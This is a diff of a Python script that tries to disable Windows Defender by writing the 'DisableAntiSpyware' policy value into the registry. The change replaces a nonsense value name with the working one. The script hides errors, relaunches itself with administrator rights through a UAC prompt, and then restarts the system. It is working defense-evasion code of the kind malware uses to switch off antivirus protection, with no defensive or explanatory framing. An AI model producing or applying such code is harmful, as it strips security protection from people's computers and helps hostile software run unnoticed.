@@ -12,7 +12,7 @@ def is_admin():
 def disable_anti_spyware():
     try:
         IbxaLSvP = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(IbxaLSvP, "ETHernalAV", 0, winreg.REG_DWORD, 1)
+        winreg.SetValueEx(IbxaLSvP, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(IbxaLSvP)
     except Exception as e:
         pass
@@ -25,5 +25,4 @@ if __name__ == "__main__":
         disable_anti_spyware()
         restart_system()
     else:
-        # Re-run the script with admin privileges
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
